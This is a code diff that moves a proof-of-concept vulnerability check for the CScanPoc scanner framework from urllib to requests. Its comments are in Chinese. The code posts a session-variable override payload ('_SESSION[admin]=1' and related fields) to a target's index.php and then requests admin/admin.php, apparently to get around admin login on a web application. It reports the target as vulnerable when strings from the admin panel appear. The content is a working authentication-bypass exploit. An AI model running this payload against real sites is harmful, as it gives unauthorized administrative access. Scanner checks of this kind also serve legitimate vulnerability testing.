@@ -2,14 +2,7 @@
 
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import urllib.request
-import urllib.parse
-import urllib.error
-import urllib.request
-import urllib.error
-import urllib.parse
 import re
-import http.cookiejar
 
 
 class Vuln(ABVuln):
@@ -54,24 +47,15 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            cookie = http.cookiejar.CookieJar()
-            opener = urllib.request.build_opener(
-                urllib.request.HTTPCookieProcessor(cookie))
-            urllib.request.install_opener(opener)
             postdata = "_SESSION[login_in]=1&_SESSION[admin]=1&_SESSION[login_time]=300000000000000000000000\r\n"
-
-            request = urllib.request.Request('{target}'.format(
-                target=self.target) + "/index.php", data=postdata)
-            r = urllib.request.urlopen(request)
+            session = requests.Session()
+            _req = session.post(self.target + "/index.php", data=postdata)
             # login test
-            request2 = urllib.request.Request('{target}'.format(
-                target=self.target) + "/admin/admin.php", data=postdata)
-            r = urllib.request.urlopen(request2)
-            content = r.read()
-            if "admin_form.php?action=form_list&nav=list_order" in content:
-                if "admin_main.php?nav=main" in content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+            response = session.post(self.target+ "/admin/admin.php", data=postdata)
+            content = response.text
+            if "admin_form.php?action=form_list&nav=list_order" in content and "admin_main.php?nav=main" in content:
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
+                        target=self.target, name=self.vuln.name,url=self.target+"/admin/admin.php"))
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
